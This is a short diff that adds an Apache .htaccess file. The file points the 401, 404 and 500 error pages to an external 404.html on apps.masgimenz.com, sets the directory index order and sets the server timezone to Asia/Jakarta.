@@ -1,0 +1,5 @@
+ErrorDocument 401 https://apps.masgimenz.com/404.html
+ErrorDocument 404 https://apps.masgimenz.com/404.html
+ErrorDocument 500 https://apps.masgimenz.com/404.html
+DirectoryIndex index.php index.html index.cgi 
+SetEnv TZ Asia/Jakarta
